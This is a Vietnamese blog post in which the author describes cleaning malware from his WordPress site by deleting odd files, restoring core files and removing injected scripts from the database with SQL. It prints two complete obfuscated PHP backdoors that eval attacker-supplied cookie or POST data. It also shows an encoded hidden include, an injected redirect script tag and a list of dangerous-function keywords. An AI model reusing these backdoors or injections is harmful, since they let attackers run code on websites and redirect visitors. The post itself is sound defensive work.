---
date: "2018-09-25T12:30:04Z"
template: "post"
cover: "../images/placeholder-660x400-344359.png"
keywords: "lập trình JavaScript"
slug: lam-sach-website-wordpress-nhu-the-nao
title: "Mình đã làm sạch website Wordpress như thế nào?"
categories:
  - Lập trình cơ bản
tags:
  - Command Line
  - Wordpress
---

Xin chào bạn! Nếu bạn theo dõi blog của mình thường xuyên thì sẽ biết rằng, vừa rồi blog của mình bị dính Malware. Điều này dẫn tới nhiều hệ quả không mong muốn. Tuy nhiên, sau chưa đầy một tuần, mình đã dọn dẹp chúng sạch sẽ. Và hôm nay, mình quyết định viết bài này để chia sẻ lại kinh nghiệm về việc mình đã làm sạch website Wordpress như thế nào.

Tuy nhiên, mình vốn dĩ không phải là một chuyên gia bảo mật, cũng không biết nhiều về Wordpress và ngôn ngữ lập trình PHP. Những kinh nghiệm mà mình chia sẻ dưới đây hoàn toàn là do góp nhặt, mỗi nơi một ít và quan trọng là đã áp dụng thành công cho blog này. Nên nếu có gì sai sót mong được bạn góp ý thêm. Còn bây giờ, xin mời bạn theo dõi bài viết!

## Malware là gì?

Theo mình hiểu, Malware là những chương trình độc hại, mã độc được cài đặt lên máy tính, trang web,... làm ảnh hướng đến quá trình sử dụng Internet của người dùng.

Khái niệm Malware là rất rộng. Tuy nhiên trong bài viết này, mình sẽ chỉ quan tâm tới trường hợp website bị nhiễm mã độc. Vậy làm sao bạn biết website bị dính Malware? Dấu hiệu nhận biết của chúng là gì?

## Dấu hiệu nhận biết website bị dính Malware

Những dấu hiệu để nhận biết website bị dính Malware là rất nhiều. Tuy nhiên, có thể chia chúng thành các loại như dưới đây.

### Redirect

Khi bạn vào một trang bất kì của website thì bỗng nhiên bị chuyển hướng sang một nơi khác. Trang đích có thể là trang quảng cáo cho một đối tượng nào đó. Hoặc nó sẽ yêu cầu bạn thực hiện một hành động.

Nếu bạn vô tình nhấn vào **Cho phép**, có nghĩa là bạn đã cho phép mã độc này thực thi các hành động nguy hiểm, không thể lường trước được.

![Blog bị dính mã độc dẫn đến chuyển hướng](/wp-content/uploads/2018/09/hacked-redirect.png)
Blog của mình bị dính mã độc và đã bị chuyển hướng đến trang cpamatik

Nếu bạn bị chuyển hướng đến những đường link dạng như phía trên, thì tốt nhất là tắt hẳn tab đó đi hoặc thậm chí, tắt luôn cả trình duyệt.

### Pop-up

Nếu bạn thấy website đột nhiên xuất hiện các pop-up lạ, banner quảng cáo không rõ nguồn gốc,... thì chắc hẳn website của bạn đã bị dính Malware Pop-up.

### Giảm traffic đột ngột

Lượng truy cập trên trang web giảm đột ngột cũng là một dấu hiệu cho thấy website của bạn bị nhiễm Malware. Vì khi đó, người dùng không truy cập vào trang web của bạn nữa.

### This site ahead contains harmful programs

Đây là trường hợp tệ nhất. Đó là khi bạn truy cập vào trang web và hiện lên hình ảnh như sau:

![Google đã đánh dấu trang web của bạn bị nhiễm mã độc](/wp-content/uploads/2018/09/harmfulprogramserror.jpg)
Website bị Google đánh dấu là chứa mã độc

Lúc này, Google đã đánh dấu trang web của bạn bị nhiễm mã độc và không an toàn.

Trên đây là một số dấu hiệu cho thấy website bị dính Malware. Vậy khi đó mình phải làm sao để làm sạch website Wordpress?

## Các bước làm sạch website Wordpress

Trong trường hợp, website của bạn được backup thường xuyên thì công việc rất đơn giản. Bạn chỉ cần cài đặt lại phiên bản gần nhất mà website vẫn còn sạch sẽ là ổn.

Nhưng tiếc là đời không như mơ, mình khá lười trong việc backup dữ liệu. Thường thì khoảng 1 đến 2 tháng mình mới sao lưu dữ liệu một lần. Nên nếu làm theo cách trên, đồng nghĩa với việc mình bị mất một lượng khá lớn các bài viết, bình luận, đánh giá của bạn đọc,... Chính vì vậy, mình đã quyết định tìm ra Malware, xóa bỏ chúng khỏi trang web và dĩ nhiên là không làm mất bất kỳ dữ liệu nào. Và sau đây là các bước mình đã thực hiện để làm sạch website Wordpress của mình.

### Clone trang web và cài đặt trên Local

Đúng vậy, đây là điều mình đã làm với hai mục đích:

- Dừng hoạt động của trang web, tránh trường hợp người dùng bị ảnh hưởng bởi mã độc.
- Cài đặt trang web trên local để dễ dàng sửa lỗi hơn.

Bạn có thể thực hiện [backup (sao lưu) dữ liệu Wordpress thủ công](https://thachpham.com/wordpress/wordpress-tutorials/cach-backup-du-lieu-thu-cong.html) và sau đó [restore (phục hồi) dữ liệu Wordpress thủ công](https://thachpham.com/wordpress/wordpress-tutorials/cach-restore-du-lieu-thu-cong.html).

Còn mình thì sẽ sử dụng plugin [Duplicator](https://wordpress.org/plugins/duplicator/) cho đơn giản. Cách thực hiện bạn có thể tham khảo bài viết này: [How to copy a live WordPress site to a local host | Duplicator](https://www.wpbasics.org/2015/07/06/how-to-copy-a-live-wordpress-site-to-a-local-host-duplicator/)

_Tiếng anh của mình cũng đủ dùng thôi, nhưng nếu có phần nào chưa rõ thì bạn cứ để lại câu hỏi ở phần bình luận phía dưới, mình sẽ cố gắng giải đáp._

Sau khi cài đặt website Wordpress trên localhost xong, giả sử mình cài đặt nó tại địa chỉ: _**C:\xampp\htdocs\completejavascript_hacked**_.

Bây giờ, bắt đầu tiến hành việc làm sạch website Wordpress thôi nào!

### Tìm và xóa những file lạ

Bước đầu tiên để làm sạch website Wordpress là tìm kiếm và xóa những file lạ. Công việc này có thể thực hiện được bằng mắt thường. Trong trường hợp của mình, mình phát hiện có 2 file lạ ngay tại thư mục gốc là:

**2mh7nzt3.php**

```
<?php
    $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));}
```

**n58afvih.php**

```
<?php
    $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));}
```

Rõ ràng 2 file này lạ về cả tên, lẫn nội dung bên trong. Chính vì vậy, chắc chắn chúng là các file chứa mã độc và cần phải xóa ngay.

### Kiểm tra mã độc chèn trong các file php

Sau bước trên, mình chỉ có thể loại bỏ được các file ở những vị trí dễ phát hiện. Vì vậy, mình tiếp tục tiến hành kiểm tra các file php xem chúng có gì khác thường không.

Các file php cơ bản như: _index.php, wp-config.php, wp-blog-header.php,..._

Thật may mắn thay khi mở file _index.php_, mình phát hiện có 1 đoạn code lạ ngay ở đầu:

```
/*238d6*/

    @include "\057home\064/pha\155vanl\057publ\151c_ht\155l/te\164risg\141mev1\057js/.\144aa29\14473.i\143o";

    /*238d6*/
```

Mình vào trang [Online PHP Decoder](https://malwaredecoder.com/) và decode được đoạn trên thành:

```
@include "/home4/phamvanl/public_html/tetrisgamev1/js/.daa29d73.ico";
```

Mình thử kiểm tra file kia xem thế nào thì đúng là nó không phải của mình tạo ra, nội dung thì còn khủng khiếp hơn 2 file php phía trên rất nhiều nên mình sẽ không trích dẫn tại đây nữa.

Như vậy nghĩa là, rất nhiều file php của mình bị chèn thêm mã độc từ file _.daa29d73.ico_. Do đó, mình tiến hành làm 2 việc:

- Xóa file _.daa29d73.ico_
- Mở toàn bộ thư mục chứa website trên một code editor (ví dụ: [Visual Studio Code](https://code.visualstudio.com/)). Rồi sử dụng chức năng tìm kiếm để xóa đoạn code _@include_ trên.

Ngoài ra, mình còn tìm kiếm trên toàn bộ website các từ khóa như:

- _base64_
- _str_rot13_
- _gzuncompress_
- _eval_
- _exec_
- _system_
- _assert_
- _stripslashes_
- _preg_replace (with /e/)_
- _move_uploaded_file_

Mình tham khảo trên một số trang thì họ bảo những câu lệnh trên rất nguy hiểm và có thể bị chèn mã độc. Nhưng may mắn thay, mình kiểm tra hết và mọi thứ vẫn OK.

Sau bước này, mình nghĩ mọi thứ đã xong. Nhưng khi chạy thử website thì vẫn bị lỗi Redirect như bình thường.

Vì vậy, mình tiếp tục tiến hành bước tiếp theo để làm sạch website Wordpress.

### Thay thế phần core của Wordpress

Thực tế, mọi website Wordpress đều có phần core giống nhau. Do đó, mình lên trang chủ [wordpress.org](https://wordpress.org/) để tải mã nguồn của Wordpress về.

Trước tiên, trong thư mục chứa website, mình giữ lại các file và thư mục sau:

- **wp-content**: chứa nội dung của website như: theme, plugin, ảnh,...
- **.htaccess**: chứa một số thông tin cấu hình của server
- **wp-config.php**: chứa một số thông tin cấu hình liên quan đến database, user, password,...

Còn lại thì mình xóa bỏ hết và thay thế chúng bởi mã nguồn sạch của Wordpress mà mình mới tải về (và nhớ là khi bạn copy mã nguồn wordpress thì chừa cái **wp-content** và **wp-config.php** ra nhé).

![sao chép phần core wordpres](/wp-content/uploads/2018/09/copy-ma-nguon-wordpress-sach.png)
Phần core của Wordpress là giống nhau đối với mọi website

Sau bước này, mình lại kiểm tra website một lần nữa thì thật buồn là website vẫn bị redirect như thường.

Nhưng ít ra mình cũng thu hẹp được phạm vi lại. Bây giờ chỉ cần check thư mục **wp-content** và file **.htaccess**, **wp-config.php.**

Kiểm tra một lượt vẫn không phát hiện ra được gì thêm. Và mình đã quyết định từ bỏ việc làm sạch website Wordpress. Chấp nhận thực hiện một phương án khác đó là: _Backup lại dữ liệu website từ khoảng 2 tháng trước, sau đó tạo lại các bài viết mới nhất một cách thủ công._

Nhưng may thay, ông trời không phụ lòng người. Khi mình mở một bài viết ra để copy dữ liệu của nó thì bỗng nhiên phát hiện ở cuối bài viết bị chèn thêm đoạn script:

```
<script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>
```

_À thì ra, khi mình click vào mỗi bài viết đều bị chuyển hướng là do trong nội dung của nó chứa đoạn script này. _

Mình mở thử các bài viết khác thì đúng thật, bài nào cũng chứa đoạn script mã độc.

### Xóa mã độc trong mỗi bài viết

Cách đơn giản nhất có thể nghĩ đến là mở mỗi bài viết ra, tìm và xóa đoạn mã độc kia đi.

Nhưng không, mình chả việc gì phải tốn công như vậy. Nội dung của mỗi bài viết đều được lưu trong database. Nghĩa là mình chỉ cần sử dụng chức năng _**Search**_ rồi xóa đoạn code kia đi là xong.

Mình mở **phpMyAdmin** lên (địa chỉ: _http://localhost/phpmyadmin/_) và bắt đầu tìm kiếm như trong hình sau:

![tìm kiếm mã độc trong database mysql](/wp-content/uploads/2018/09/search_phpmyadmin.png)
Tìm kiếm đoạn mã độc trong tất cả các bảng của database

Đúng là không ngoài dự đoán, mình tìm thấy **306 kết quả chứa đoạn mã độc** trên:

![Kết quả tìm kiếm mã độc trong database mysql](/wp-content/uploads/2018/09/search_phpmyadmin_result.png)
Kết quả tìm kiếm mã độc

Mình chọn tiếp vào chữ _**Browse**_ để xem cụ thể mã độc nằm ở cột nào trong bảng **wp_luqd_posts:**

![thông tin chi tiết mã độc](/wp-content/uploads/2018/09/search_phpmyadmin_browse.png)
Thông tin chi tiết về vị trí của mã độc

Như vậy, đoạn mã độc nằm trong cột **post_content** của bảng **wp_luqd_posts**. Bây giờ, mình chỉ cần viết câu lệnh SQL để tìm kiếm và thay thế đoạn mã độc kia đi là xong.

Mình tiếp tục chọn mục tab SQL và viết câu lệnh SQL này ra:

```
UPDATE wp_luqd_posts set post_content = replace(post_content, "<script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>", '');
```

![câu lệnh sql thay thế mã độc bằng kí tự rỗng](/wp-content/uploads/2018/09/phpmyadmin_query.png)
Thực hiện câu lệnh SQL để tìm đoạn mã độc và thay thế

Sau khi thực hiện thành công câu lệnh trên, mình kiểm tra lại database một lượt để chắc chắn rằng không tồn tại đoạn mã độc kia nữa.

![kiểm tra lại database xem còn mã độc không](/wp-content/uploads/2018/09/result_phpmyadmin.png)
Database đã không còn mã độc

Để chắc chắn hơn, mình tìm kiếm thêm với các từ khóa như:

- _type='text/javascript'_
- _<script src=_

Không tìm thêm bất cứ điều gì khả nghi, mình kiểm tra lại website thì thấy nó hoạt động khá ổn, không còn dấu hiệu của Malware nữa.

## Lời kết

Như vậy là thông qua những bước kể trên, mình đã làm sạch website Wordpress thành công. Mình không hy vọng website của bạn cũng bị dính Malware. Nhưng nếu chẳng may điều đó xảy ra thì những cách mình kể trên đây có thể giúp ích phần nào cho bạn.

_Nhưng suy cho cùng, đây cũng chỉ là phần ngọn, còn gốc rễ của vấn đề thì mình vẫn chưa tìm ra. Nếu cứ như này thì rất có thể vào một ngày đẹp trời blog của mình lại bị dính Malware một lần nữa. Vì vậy, mình đã thực hiện một số biện pháp cần thiết để tăng cường bảo mật cho website._

Bài viết này mình xin dừng lại tại đây. Bài viết sau mình sẽ tiếp tục chia sẻ về JavaScript. Rất mong bạn tiếp tục theo dõi blog của mình!

Thân ái,

★ Tham khảo:

- [Malware là gì? Làm gì khi website bị nhiễm Malware?](https://www.webico.vn/malware-la-gi-lam-gi-khi-website-bi-nhiem-malware/)
- [Series: Bảo mật Wordpress](https://thachpham.com/series/bao-mat-wordpress-serie)

---

★ Theo dõi [Lam Pham](/gioi-thieu/) để nhận được thông báo khi có bài viết mới nhất:

- Facebook Fanpage: [Complete JavaScript](https://www.facebook.com/completejavascript/)  
- Facebook Group: [Hỏi đáp JavaScript VN](https://www.facebook.com/groups/HoiDapJavascriptVN)  
**☛ Portfoflio** : [Lam Pham](http://about.phamvanlam.com/)
